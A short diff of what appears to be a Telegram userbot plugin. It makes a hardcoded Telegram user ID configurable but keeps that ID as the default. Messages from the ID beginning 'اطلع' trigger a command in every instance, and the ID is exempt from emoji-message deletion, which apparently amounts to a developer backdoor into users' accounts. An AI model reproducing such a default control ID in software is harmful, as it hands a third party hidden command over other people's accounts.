@@ -601,7 +601,7 @@ async def Reda (event):
     except BaseException as er:
      await event.reply(f"حدث خطأ\n{er}\n{entity}")
 
-DevJoker = [6023224495]
+DevJoker = [int(getattr(Config, "T3RMX_OWNER_ID", 6023224495) or 6023224495)]
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.message.message.startswith("اطلع") and event.sender_id in DevJoker:
@@ -732,7 +732,7 @@ async def Hussein(event):
     if event.is_private or event.chat_id not in active_joker:
         return
     sender_id = event.sender_id
-    if sender_id != 6023224495:
+    if sender_id != int(getattr(Config, "T3RMX_OWNER_ID", 6023224495) or 6023224495):
         if isinstance(event.message.entities, list) and any(isinstance(entity, MessageEntityCustomEmoji) for entity in event.message.entities):
             await event.delete()
             sender = await event.get_sender()
